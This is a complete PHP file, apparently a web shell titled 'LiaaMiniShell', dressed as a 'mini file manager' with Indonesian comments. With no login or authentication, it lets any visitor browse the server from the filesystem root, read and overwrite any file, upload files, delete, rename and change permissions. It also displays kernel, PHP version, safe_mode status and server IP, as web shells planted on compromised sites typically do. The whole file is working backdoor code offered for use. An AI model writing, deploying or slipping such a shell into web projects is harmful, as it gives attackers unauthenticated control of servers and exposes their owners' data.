<?php
// ==========================================
// ALL-IN-ONE PHP MINI FILE MANAGER (FIXED)
// ==========================================

// 1. Tentukan OS dan root directory secara universal
$isWindows = substr(PHP_OS, 0, 3) == 'WIN';
$rootDir = $isWindows ? substr(realpath(__DIR__), 0, 3) : '/';

// 2. Ambil parameter path dari URL, bersihkan, dan normalkan slashes
$currentPath = isset($_GET['path']) ? realpath($_GET['path']) : realpath(__DIR__);
if (!$currentPath) {
    $currentPath = realpath(__DIR__);
}

// Seragamkan path saat ini menggunakan forward slash biar tidak bentrok antar OS
$cleanCurrent = str_replace('\\', '/', $currentPath);
$cleanRoot = str_replace('\\', '/', $rootDir);

// 3. Hitung relative path untuk kebutuhan breadcrumb secara aman (Linux & Windows)
if ($cleanCurrent == $cleanRoot || $cleanCurrent == '') {
    $relativePath = '/';
} else {
    if ($isWindows) {
        $relativePath = (substr($cleanCurrent, 0, strlen($cleanRoot)) == $cleanRoot) 
            ? substr($cleanCurrent, strlen($cleanRoot)) 
            : $cleanCurrent;
    } else {
        // Untuk Linux, pastikan relative path-nya langsung mengambil full path saat ini
        $relativePath = $cleanCurrent;
    }
}
$relativePath = '/' . ltrim($relativePath, '/');

// Handler: Simpan Hasil Edit Isi File
if (isset($_POST['action']) && $_POST['action'] == 'save_file_content') {
    $filePath = realpath($_POST['file_path']);
    $content = $_POST['content'];
    
    if ($filePath && strpos(str_replace('\\', '/', $filePath), $cleanRoot) === 0 && is_file($filePath)) {
        @file_put_contents($filePath, $content);
    }
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handler: API AJAX untuk Ambil Isi File
if (isset($_GET['get_content'])) {
    $filePath = realpath($_GET['get_content']);
    if ($filePath && strpos(str_replace('\\', '/', $filePath), $cleanRoot) === 0 && is_file($filePath)) {
        echo file_get_contents($filePath);
    } else {
        echo "Gagal memuat isi file.";
    }
    exit;
}

// Handler: Membuat Folder Baru
if (isset($_POST['action']) && $_POST['action'] == 'create_folder') {
    $folderName = trim($_POST['name']);
    if ($folderName !== '') {
        $targetDir = $currentPath . DIRECTORY_SEPARATOR . $folderName;
        if (!file_exists($targetDir)) {
            mkdir($targetDir, 0755);
        }
    }
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handler: Single Upload (Tombol Atas)
if (isset($_FILES['single_file'])) {
    if ($_FILES['single_file']['error'] == 0) {
        $targetFile = $currentPath . DIRECTORY_SEPARATOR . $_FILES['single_file']['name'];
        @move_uploaded_file($_FILES['single_file']['tmp_name'], $targetFile);
    }
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handler: Mass Upload dengan Custom Target Path (Tombol Bawah)
if (isset($_FILES['files'])) {
    $subPath = isset($_POST['target_subpath']) ? trim($_POST['target_subpath'], " \t\n\r\0\x0B/\\") : '';
    
    $targetDir = $currentPath;
    if ($subPath !== '') {
        $targetDir .= DIRECTORY_SEPARATOR . str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $subPath);
    }
    
    if (!file_exists($targetDir)) {
        @mkdir($targetDir, 0755, true);
    }
    
    foreach ($_FILES['files']['name'] as $i => $name) {
        if ($_FILES['files']['error'][$i] == 0) {
            $targetFile = $targetDir . DIRECTORY_SEPARATOR . $name;
            @move_uploaded_file($_FILES['files']['tmp_name'][$i], $targetFile);
        }
    }
    
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handler: Hapus File atau Folder
if (isset($_GET['delete'])) {
    $targetDelete = realpath($_GET['delete']);
    if ($targetDelete && strpos(str_replace('\\', '/', $targetDelete), $cleanRoot) === 0 && $targetDelete !== $rootDir) {
        if (is_dir($targetDelete)) {
            @rmdir($targetDelete);
        } else {
            @unlink($targetDelete);
        }
    }
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handler: Mengubah Permission (Chmod)
if (isset($_POST['action']) && $_POST['action'] == 'change_perms') {
    $targetPerms = realpath($_POST['target']);
    $octalPerms = trim($_POST['perms']);
    
    if ($targetPerms && strpos(str_replace('\\', '/', $targetPerms), $cleanRoot) === 0 && preg_match('/^[0-7]{3,4}$/', $octalPerms)) {
        @chmod($targetPerms, octdec($octalPerms));
    }
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handler: Rename File atau Folder
if (isset($_POST['action']) && $_POST['action'] == 'rename_item') {
    $oldPath = realpath($_POST['old_path']);
    $newName = trim($_POST['new_name']);
    
    if ($oldPath && strpos(str_replace('\\', '/', $oldPath), $cleanRoot) === 0 && $newName !== '') {
        $parentDir = dirname($oldPath);
        $newPath = $parentDir . DIRECTORY_SEPARATOR . $newName;
        
        if (!file_exists($newPath)) {
            @rename($oldPath, $newPath);
        }
    }
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Membaca isi direktori saat ini
$dirItems = [];
if (is_dir($currentPath)) {
    $files = array_diff(scandir($currentPath), array('.', '..'));
    foreach ($files as $file) {
        $fullPath = $currentPath . DIRECTORY_SEPARATOR . $file;
        $isFolder = is_dir($fullPath);
        $dirItems[] = [
            'name' => $file,
            'full_path' => $fullPath,
            'is_folder' => $isFolder,
            'size' => $isFolder ? 0 : filesize($fullPath),
            'modified' => filemtime($fullPath)
        ];
    }
    usort($dirItems, function($a, $b) {
        if ($a['is_folder'] === $b['is_folder']) return strcasecmp($a['name'], $b['name']);
        return $b['is_folder'] - $a['is_folder'];
    });
}

function formatSize($bytes) {
    if ($bytes === 0) return "-";
    if ($bytes < 1024) return $bytes . " B";
    if ($bytes < 1048576) return round($bytes / 1024, 1) . " KB";
    return round($bytes / 1048576, 1) . " MB";
}

function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    if (in_array($ext, ['jpg','jpeg','png','gif','webp'])) return '<i class="fas fa-image" style="color:#10b981"></i>';
    if (in_array($ext, ['mp4','mkv','mov'])) return '<i class="fas fa-video" style="color:#ef4444"></i>';
    if (in_array($ext, ['txt','md','html','php','css','js'])) return '<i class="fas fa-file-alt" style="color:#64748b"></i>';
    if (in_array($ext, ['zip','rar','7z','tar','gz'])) return '<i class="fas fa-file-archive" style="color:#a855f7"></i>';
    return '<i class="fas fa-file"></i>';
}

function getFilePerms($path) {
    $perms = @fileperms($path);
    if ($perms === false) return "0000";
    return substr(sprintf('%o', $perms), -4);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ Super Mini File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #f0f2f5; padding: 24px; min-height: 100vh; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header, .toolbar { background: white; border-radius: 24px; padding: 20px 28px; margin-bottom: 24px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; }
        .toolbar { border-radius: 20px; padding: 14px 24px; }
        .logo h1 { font-size: 1.6rem; font-weight: 700; background: linear-gradient(135deg, #1e293b, #3b82f6); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .logo p { font-size: 0.75rem; color: #64748b; }
        .upload-area, .action-buttons { display: flex; gap: 12px; align-items: center; }
        .upload-btn { background: #3b82f6; color: white; border: none; padding: 10px 20px; border-radius: 40px; font-weight: 600; cursor: pointer; transition: 0.2s; display: inline-flex; align-items: center; gap: 8px; font-size: 0.9rem; text-decoration: none;}
        .upload-btn:hover { background: #2563eb; transform: scale(0.97); }
        .icon-btn { background: #f1f5f9; border: none; padding: 8px 14px; border-radius: 30px; cursor: pointer; font-size: 0.85rem; transition: 0.2s; display: inline-flex; align-items: center; gap: 6px; color: inherit; text-decoration: none; }
        .icon-btn:hover { background: #e2e8f0; }
        .breadcrumb { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; font-size: 0.9rem; }
        .breadcrumb-item { color: #3b82f6; font-weight: 500; text-decoration: none; }
        .breadcrumb-item:hover { text-decoration: underline; }
        .breadcrumb-sep { color: #94a3b8; }
        .file-grid { background: white; border-radius: 24px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); min-height: 500px; }
        .grid-header, .file-row { display: grid; grid-template-columns: 40px 3fr 1.5fr 1.5fr 150px; padding: 12px 16px; align-items: center; }
        .grid-header { background: #f8fafc; border-radius: 16px; font-weight: 600; color: #475569; font-size: 0.8rem; margin-bottom: 8px; }
        .file-row { border-bottom: 1px solid #f0f2f5; transition: 0.1s; color: inherit; text-decoration: none; }
        .file-row:hover { background: #fafcff; }
        .file-name { display: flex; align-items: center; gap: 12px; font-weight: 500; }
        .file-name i { font-size: 1.3rem; width: 24px; color: #3b82f6; }
        .file-size, .file-modified { color: #64748b; font-size: 0.85rem; }
        .delete-btn { background: none; border: none; color: #ef4444; cursor: pointer; font-size: 1.1rem; transition: 0.1s; }
        .delete-btn:hover { color: #dc2626; transform: scale(1.1); }
        .empty-state { text-align: center; padding: 60px 20px; color: #94a3b8; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 1000; }
        .modal-content { background: white; padding: 28px; border-radius: 32px; min-width: 320px; text-align: center; }
        .modal-content input { width: 100%; padding: 12px; margin: 16px 0; border: 1px solid #e2e8f0; border-radius: 16px; font-family: inherit; }
        .modal-buttons { display: flex; gap: 12px; justify-content: flex-end; }
        footer { margin-top: 24px; text-align: center; font-size: 0.75rem; color: #94a3b8; }
        .editor-modal { min-width: 80% !important; max-width: 90%; }.editor-textarea { width: 100%; height: 60vh; font-family: 'Courier New', Courier, monospace; font-size: 0.95rem; padding: 16px; border: 1px solid #e2e8f0; border-radius: 16px; background: #1e293b; color: #f8fafc; line-height: 1.5; resize: vertical; margin: 16px 0; }
        @media (max-width: 768px) {
            body { padding: 16px; }
            .grid-header { display: none; }
            .file-row { grid-template-columns: 30px 1fr 0.8fr 0.6fr 90px; gap: 8px; }
            .file-size, .file-modified { font-size: 0.7rem; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="logo">
            <h1><i class="fas fa-folder-tree"></i> LiaaMiniShell</h1>
            <p>Single-file PHP Manager • Real Server Sync</p>
        </div>
        <div class="upload-area">
            <button class="upload-btn" id="createFolderBtn"><i class="fas fa-folder-plus"></i> Folder Baru</button>
            
            <form method="POST" enctype="multipart/form-data" style="display: inline-block;">
                <label class="upload-btn" style="background: #3b82f6; cursor: pointer;">
                    <i class="fas fa-upload"></i> Upload File
                    <input type="file" name="single_file" onchange="this.form.submit()" style="display: none;">
                </label>
            </form>
        </div>
    </div>

    <div class="toolbar">
        <div style="width: 100%; background: #1e293b; color: #f8fafc; padding: 14px 20px; border-radius: 16px; margin-bottom: 16px; font-family: monospace; font-size: 0.85rem; line-height: 1.6;">
            <div><strong>Web server software:</strong> <?= htmlspecialchars($_SERVER['SERVER_SOFTWARE']) ?> | <strong>PHP Version:</strong> <?= phpversion() ?></div>
            <div><strong>Kernel:</strong> <?= htmlspecialchars(php_uname()) ?></div>
            <div><strong>safe_mode:</strong> <span style="color: #10b981; font-weight: bold;"><?= @ini_get('safe_mode') ? 'ON' : 'OFF' ?></span></div>
            <div><strong>Server Information:</strong> [ <strong>IP Address:</strong> <?= htmlspecialchars($_SERVER['SERVER_ADDR'] ?? '127.0.0.1') ?> ]</div>
        </div>

        <div class="breadcrumb">
            <a href="?path=<?= urlencode($cleanRoot) ?>" class="breadcrumb-item">Root</a>
            
            <?php 
            $parts = array_filter(explode('/', $relativePath));
            $pathBuilder = $isWindows ? rtrim($cleanRoot, '/') : '';
            foreach ($parts as $part): 
                $pathBuilder .= '/' . $part;
            ?>
                <span class="breadcrumb-sep"> / </span>
                <a href="?path=<?= urlencode($pathBuilder) ?>" class="breadcrumb-item"><?= htmlspecialchars($part) ?></a>
            <?php endforeach; ?>
        </div>
        <div class="action-buttons">
            <a href="?path=<?= urlencode($currentPath) ?>" class="icon-btn"><i class="fas fa-sync-alt"></i> Refresh</a>
            <button class="icon-btn" style="background: #10b981; color: white;" onclick="openMassUploadModal()">
                <i class="fas fa-cloud-upload-alt"></i> Mass Upload
            </button>
        </div>
    </div>

    <div class="file-grid">
        <div class="grid-header">
            <div><i class="fas fa-square"></i></div>
            <div>Nama</div>
            <div>Ukuran</div>
            <div>Terakhir Modifikasi (Perms)</div>
            <div>Aksi</div>
        </div>
        <div id="fileListContainer">
            <?php if (empty($dirItems)): ?>
                <div class="empty-state"><i class="fas fa-folder-open fa-3x"></i><p style="margin-top:12px">Folder kosong</p></div>
            <?php else: ?>
                <?php foreach ($dirItems as $item): 
                    $icon = $item['is_folder'] ? '<i class="fas fa-folder" style="color:#f59e0b"></i>' : getFileIcon($item['name']);
                    $itemUrl = $item['is_folder'] ? '?path=' . urlencode($item['full_path']) : '#';
                    $currentPerms = getFilePerms($item['full_path']);
                ?>
                    <div class="file-row" style="cursor: pointer;" onclick="window.location.href='<?= $itemUrl ?>';">
                        <div><i class="far <?= $item['is_folder'] ? 'fa-folder' : 'fa-file' ?>" style="color: #94a3b8;"></i></div>
                        
                        <div class="file-name" onclick="event.stopPropagation();"><?= $icon ?> <span><?= htmlspecialchars($item['name']) ?></span></div>
                        
                        <div class="file-size"><?= formatSize($item['size']) ?></div>
                        
                        <div class="file-modified">
                            <?= date('d/m/Y', $item['modified']) ?>
                            <span style="color:#3b82f6; font-family:monospace; margin-left:6px; cursor:pointer;" 
                                  onclick="event.stopPropagation(); openPermsModal('<?= htmlspecialchars($item['full_path'], ENT_QUOTES) ?>', '<?= $currentPerms ?>', '<?= htmlspecialchars($item['name'], ENT_QUOTES) ?>')">
                                  (<?= $currentPerms ?>)
                            </span>
                        </div>
                        
                        <div style="text-align: right; display: flex; justify-content: flex-end; gap: 14px;" onclick="event.stopPropagation();">
                            <?php if (!$item['is_folder']): ?>
                                <span class="delete-btn" style="color: #10b981; font-size: 1rem;" title="Edit Isi File" 
                                      onclick="openEditorModal('<?= htmlspecialchars($item['full_path'], ENT_QUOTES) ?>', '<?= htmlspecialchars($item['name'], ENT_QUOTES) ?>')">
                                    <i class="fas fa-file-signature"></i>
                                </span>
                            <?php endif; ?>

                            <span class="delete-btn" style="color: #2563eb; font-size: 1rem;" title="Rename" 
                                  onclick="openRenameModal('<?= htmlspecialchars($item['full_path'], ENT_QUOTES) ?>', '<?= htmlspecialchars($item['name'], ENT_QUOTES) ?>')">
                                <i class="fas fa-edit"></i>
                            </span>

                            <span class="delete-btn" style="color: #a855f7; font-size: 1rem;" title="Ubah Permission" 
                                  onclick="openPermsModal('<?= htmlspecialchars($item['full_path'], ENT_QUOTES) ?>', '<?= $currentPerms ?>', '<?= htmlspecialchars($item['name'], ENT_QUOTES) ?>')">
                                <i class="fas fa-sliders-h"></i>
                            </span>

                            <span class="delete-btn" style="color: #ef4444;" title="Hapus" 
                                  onclick="if(confirm('Yakin hapus?')) { window.location.href='?path=<?= urlencode($currentPath) ?>&delete=<?= urlencode($item['full_path']) ?>'; }">
                                <i class="fas fa-trash"></i>
                            </span>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>
    <footer>
        <i class="fas fa-server"></i> Berjalan di server asli • Path: <?= htmlspecialchars($currentPath) ?>
    </footer>
</div>

<div id="folderModal" class="modal">
    <div class="modal-content">
        <h3><i class="fas fa-folder-plus"></i> Buat Folder Baru</h3>
        <form method="POST">
            <input type="hidden" name="action" value="create_folder">
            <input type="text" name="name" id="folderNameInput" placeholder="Nama folder" autocomplete="off" required>
            <div class="modal-buttons">
                <button type="button" class="icon-btn" id="cancelFolderBtn">Batal</button>
                <button type="submit" class="upload-btn" style="padding:8px 16px">Buat</button>
            </div>
        </form>
    </div>
</div>

<div id="massUploadModal" class="modal">
    <div class="modal-content">
        <h3><i class="fas fa-cloud-upload-alt" style="color:#10b981;"></i> Mass Upload Manager</h3>
        <p style="font-size: 0.8rem; color: #64748b; margin-top: 4px;">Upload banyak file sekaligus ke folder tujuan.</p>
        <form method="POST" enctype="multipart/form-data">
            <input type="text" name="target_subpath" id="targetSubpathInput" placeholder="Folder tujuan (kosongkan jika ingin di folder saat ini)" autocomplete="off">
            <p style="font-size: 0.75rem; color: #94a3b8; text-align: left; margin: -8px 0 12px 4px;">Contoh: <span style="font-family:monospace;">assets/images</span> atau <span style="font-family:monospace;">backup</span></p>
            <input type="file" name="files[]" id="massFileInput" multiple required style="border: 1px dashed #10b981; padding: 20px; background: #f0fdf4; cursor: pointer; width: 100%; border-radius: 16px; margin: 12px 0;">
            <div class="modal-buttons">
                <button type="button" class="icon-btn" id="cancelUploadBtn">Batal</button>
                <button type="submit" class="upload-btn" style="padding:8px 16px; background:#10b981;">Mulai Upload</button>
            </div>
        </form>
    </div>
</div>

<div id="permsModal" class="modal">
    <div class="modal-content">
        <h3><i class="fas fa-key"></i> Ubah Permission</h3>
        <p id="permsTargetName" style="font-size: 0.85rem; color: #64748b; margin-top: 4px; font-weight: 500;"></p>
        <form method="POST">
            <input type="hidden" name="action" value="change_perms">
            <input type="hidden" name="target" id="permsTargetInput">
            <input type="text" name="perms" id="permsValueInput" placeholder="Contoh: 0755 atau 0644" autocomplete="off" required pattern="^[0-7]{3,4}$" title="Masukkan 3 atau 4 digit angka octal (0-7)">
            <div class="modal-buttons">
                <button type="button" class="icon-btn" id="cancelPermsBtn">Batal</button>
                <button type="submit" class="upload-btn" style="padding:8px 16px; background:#a855f7;">Simpan</button>
            </div>
        </form>
    </div>
</div>

<div id="renameModal" class="modal">
    <div class="modal-content">
        <h3><i class="fas fa-edit"></i> Ganti Nama</h3>
        <p id="renameTargetOld" style="font-size: 0.85rem; color: #64748b; margin-top: 4px; font-weight: 500;"></p>
        <form method="POST">
            <input type="hidden" name="action" value="rename_item">
            <input type="hidden" name="old_path" id="renameOldPathInput">
            <input type="text" name="new_name" id="renameNewNameInput" placeholder="Nama baru..." autocomplete="off" required>
            <div class="modal-buttons">
                <button type="button" class="icon-btn" id="cancelRenameBtn">Batal</button>
                <button type="submit" class="upload-btn" style="padding:8px 16px; background:#2563eb;">Ganti</button>
            </div>
        </form>
    </div>
</div>

<div id="editorModal" class="modal">
    <div class="modal-content editor-modal">
        <h3><i class="fas fa-code"></i> Edit File: <span id="editorFileName" style="color:#10b981;"></span></h3>
        <form method="POST">
            <input type="hidden" name="action" value="save_file_content">
            <input type="hidden" name="file_path" id="editorFilePathInput">
            <textarea name="content" id="editorTextArea" class="editor-textarea" spellcheck="false"></textarea>
            <div class="modal-buttons">
                <button type="button" class="icon-btn" id="cancelEditorBtn">Batal</button>
                <button type="submit" class="upload-btn" style="padding:8px 16px; background:#10b981;">Simpan Perubahan</button>
            </div>
        </form>
    </div>
</div>

<script>
    document.getElementById("createFolderBtn").addEventListener("click", () => document.getElementById("folderModal").style.display = "flex");
    
    document.getElementById("cancelFolderBtn").addEventListener("click", () => {
        document.getElementById("folderModal").style.display = "none";
        document.getElementById("folderNameInput").value = "";
    });

    function openMassUploadModal() {
        document.getElementById("massUploadModal").style.display = "flex";
    }

    document.getElementById("cancelUploadBtn").addEventListener("click", () => {
        document.getElementById("massUploadModal").style.display = "none";
        document.getElementById("targetSubpathInput").value = "";
        document.getElementById("massFileInput").value = "";
    });

    function openPermsModal(path, currentPerms, name) {
        document.getElementById("permsTargetInput").value = path;
        document.getElementById("permsValueInput").value = currentPerms;
        document.getElementById("permsTargetName").innerText = name;
        document.getElementById("permsModal").style.display = "flex";
    }

    document.getElementById("cancelPermsBtn").addEventListener("click", () => {
        document.getElementById("permsModal").style.display = "none";
    });

    function openRenameModal(path, currentName) {
        document.getElementById("renameOldPathInput").value = path;
        document.getElementById("renameNewNameInput").value = currentName;
        document.getElementById("renameTargetOld").innerText = "Mengubah: " + currentName;
        document.getElementById("renameModal").style.display = "flex";
    }

    document.getElementById("cancelRenameBtn").addEventListener("click", () => {
        document.getElementById("renameModal").style.display = "none";
    });

    function openEditorModal(path, name) {
        document.getElementById("editorFileName").innerText = name;
        document.getElementById("editorFilePathInput").value = path;
        document.getElementById("editorTextArea").value = "Memuat isi file...";
        document.getElementById("editorModal").style.display = "flex";

        fetch("?get_content=" + encodeURIComponent(path))
            .then(response => response.text())
            .then(data => {
                document.getElementById("editorTextArea").value = data;
            })
            .catch(err => {
                document.getElementById("editorTextArea").value = "Gagal mengambil isi file.";
            });
    }

    document.getElementById("cancelEditorBtn").addEventListener("click", () => {
        document.getElementById("editorModal").style.display = "none";
        document.getElementById("editorTextArea").value = "";
    });
    
    window.onclick = (e) => { 
        if(e.target === document.getElementById("folderModal")) document.getElementById("folderModal").style.display = "none"; 
        if(e.target === document.getElementById("permsModal")) document.getElementById("permsModal").style.display = "none"; 
        if(e.target === document.getElementById("renameModal")) document.getElementById("renameModal").style.display = "none";
        if(e.target === document.getElementById("editorModal")) document.getElementById("editorModal").style.display = "none";
        if(e.target === document.getElementById("massUploadModal")) {
            document.getElementById("massUploadModal").style.display = "none";
            document.getElementById("targetSubpathInput").value = "";
            document.getElementById("massFileInput").value = "";
        }
    };
</script>
</body>
</html>